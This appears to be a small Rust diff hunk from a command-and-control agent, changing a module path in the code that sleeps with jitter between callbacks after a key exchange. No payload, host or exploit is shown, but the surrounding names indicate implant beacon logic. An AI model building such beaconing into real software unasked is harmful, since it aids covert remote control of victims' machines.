@@ -128,7 +128,7 @@ impl Profile {
             self.perform_key_exchange()?;
             let sleep_interval = payloadvars::callback_interval() / 4;
             let sleep_interval =
-                crate::agent::calculate_sleep_time(sleep_interval, payloadvars::callback_jitter());
+                agent::calculate_sleep_time(sleep_interval, payloadvars::callback_jitter());
             std::thread::sleep(std::time::Duration::from_secs(sleep_interval));
         }
 
